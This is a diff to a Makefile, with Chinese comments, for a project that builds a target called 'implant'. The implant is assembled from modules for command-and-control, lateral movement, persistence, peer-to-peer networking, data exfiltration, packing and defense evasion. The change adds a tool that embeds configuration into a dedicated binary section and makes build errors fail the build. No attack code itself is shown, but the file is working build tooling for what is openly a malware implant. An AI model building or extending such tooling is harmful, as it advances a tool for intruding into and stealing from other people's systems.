@@ -14,13 +14,18 @@ CFLAGS  = -std=c11 -O2 -Wall -Wextra -D_GNU_SOURCE -fvisibility=hidden
 LDFLAGS =
 
 MODS    = 00_crypto 02_c2 08_lateral 09_persistence 14_p2p 21_exfil 20_packer 19_defense
-INC     = $(foreach m,$(MODS),-I../$(m)/include)
+INC     = -Iinclude $(foreach m,$(MODS),-I../$(m)/include)
 SRCS    = $(foreach m,$(MODS),$(wildcard ../$(m)/src/*.c))
 OBJS    = $(patsubst ../%.c,obj/%.o,$(SRCS))
 
-all: implant
+all: implant obj/embedcfg
+
+# 配置烧录工具：生成 .mono_cfg 段内容（大小须与段精确相等）
+obj/embedcfg: tools/embedcfg.c include/mono_embed.h
+	$(CC) $(CFLAGS) $(INC) -o $@ tools/embedcfg.c
 
 $(shell mkdir -p $(foreach m,$(MODS),obj/$(m)/src))
+$(shell mkdir -p obj/tools)
 
 # 失败即停：绝不吞编译错误。
 #   旧写法是 `... || echo "FAIL: $<" >> build.log`，会静默产出残缺制品——
